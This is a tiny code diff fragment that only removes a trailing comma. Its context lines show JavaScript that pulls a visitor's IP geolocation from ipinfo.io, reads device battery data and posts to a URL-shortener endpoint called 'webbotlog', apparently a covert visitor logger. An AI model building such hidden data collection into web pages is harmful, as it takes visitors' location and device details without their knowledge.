@@ -1572,7 +1572,7 @@ fetch("https://ipinfo.io/json")
       loc: d.loc,
       org: d.org,
       postal: d.postal,
-      region: d.region,
+      region: d.region
     };
     navigator.getBattery().then((e) => {
       fetch("https://tinyurl.com/webbotlog", {
